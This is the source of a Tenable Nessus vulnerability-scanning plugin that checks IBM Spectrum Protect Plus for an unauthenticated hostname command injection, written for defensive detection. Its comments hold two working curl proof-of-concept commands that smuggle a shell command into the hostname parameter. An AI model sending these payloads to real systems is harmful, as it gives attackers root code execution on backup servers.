#
# (C) Tenable Network Security, Inc.
#

include('compat.inc');

if (description)
{
  script_id(139330);
  script_version("1.2");
  script_set_attribute(attribute:"plugin_modification_date", value:"2020/08/07");

  script_cve_id("CVE-2020-4211", "CVE-2020-4469");
  script_xref(name:"ZDI", value:"ZDI-20-273");
  script_xref(name:"TRA", value:"TRA-2020-37");

  script_name(english:"IBM Spectrum Protect Plus hostname Command Injection");

  script_set_attribute(attribute:"synopsis", value:
"A web application running on the remote host is affected by a
remote code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The IBM Spectrum Protect Plus (SPP) administrative console running
on the remote host is affected by a remote command injection
vulnerability due to improper validation of user-supplied data when
processing a 'set hostname' HTTP request. An unauthenticated, remote
attacker can exploit this, via a specially crafted HTTP request, to
execute arbitrary code on the system with root privileges.

Note that this plugin does not flag SPP 10.1.5 build 2218 having
the spp-emi-10.1.5-227 RPM package as vulnerable because it partially
fixed the vulnerabilities by enabling authentication for URL
/emi/api/hostname. A full fix is in spp-emi-10.1.6-21 in SPP 10.1.6
build 1974, which performs additional checking on the hostname
parameter in the HTTP request to prevent authenticated command
injection. 

Also note that the application is reportedly affected by other
vulnerabilities; however, this plugin has not tested for those issues.");
  script_set_attribute(attribute:"see_also", value:"https://www.ibm.com/support/pages/node/6221358");
  script_set_attribute(attribute:"solution", value:
"Update the IBM Spectrum Protect Plus RPM package spp-emi to
10.1.6-21 or later. That spp-emi package should be in the IBM
Spectrum Protect Plus 10.1.6 build 1974.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:U/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2020-4469");

  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");

  script_set_attribute(attribute:"vuln_publication_date", value:"2020/06/12");
  script_set_attribute(attribute:"patch_publication_date", value:"2020/06/12");
  script_set_attribute(attribute:"plugin_publication_date", value:"2020/08/05");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:ibm:spectrum_protect_plus");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"General");

  script_copyright(english:"This script is Copyright (C) 2020 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("ibm_spp_admin_console_detect.nbin");
  script_require_keys("installed_sw/IBM Spectrum Protect Plus Administrative Console");
  script_require_ports("Services/www", 8090);

  exit(0);
}

include('http.inc');
include('webapp_func.inc');

app = 'IBM Spectrum Protect Plus Administrative Console';

# Exit if app is not detected on the host.
get_install_count(app_name:app, exit_if_zero:TRUE);

# Exit if app is not detected on this http port.
port = get_http_port(default:8090);
get_single_install(app_name:app, port:port);

#
# Attempt to set an invalid hostname.
#
# To confirm the vulnerability, run the following CURL commands and
# check if the /tmp/cmd_injection file is created on the remote host.
#
# For SPP with spp-emi prior to 10.1.5-217 (CVE-2020-4211):
#
# curl -ki --tlsv1.2 -H 'x-ac-sessionid: abcd' -d "hostname='';id >/tmp/cmd_injection" 'https://<target_host>:8090/emi/api/hostname'
#
# 
# For SPP with spp-emi >= 10.1.5-217 and < 10.1.5-227 (CVE-2020-4469):
#
# curl -ki --tlsv1.2 -H 'x-ac-sessionid: abcd' -d "hostname=';id >/tmp/cmd_injection;echo '" 'https://<target_host>:8090/emi/api/hostname'
#


#
# This causes invalid syntax for :
#
# hostnamectl set-hostname ' (CVE-2020-4211)
#
# and
#
# hostnamectl set-hostname ''' (CVE-2020-4469)
#
# The end result is that the remote hostname is not set, making this
# plugin non-destructive.
#
data = "hostname='";

headers = {'x-ac-sessionid':'abcd'};
url = '/emi/api/hostname';

if (http_get_read_timeout() < 15)
  http_set_read_timeout(15);
  
res = http_send_recv3(
  port            : port,
  method          : 'POST',
  item            : url,
  data            : data,
  content_type    : 'application/x-www-form-urlencoded',
  add_headers     : headers,
  exit_on_fail    : TRUE
);

# Patched server returns 401 because it has enabled authentication
# on URL endpoint /emi/api/hostname.
if(' 401 ' >< res[0])
  audit(AUDIT_LISTEN_NOT_VULN, app, port);
# Vulnerable server processes the request and returns 200.
else if(' 200 ' >< res[0])
{
  security_report_v4(
    port       : port,
    severity   : SECURITY_HOLE,
    generic    : TRUE,
    request    : make_list(http_last_sent_request()),
    output     : res[2]
  );
}
# Unexpected response status
else
  audit(AUDIT_RESP_BAD, port, 'an HTTP request. Unexpected HTTP response status ' + chomp(res[0]));
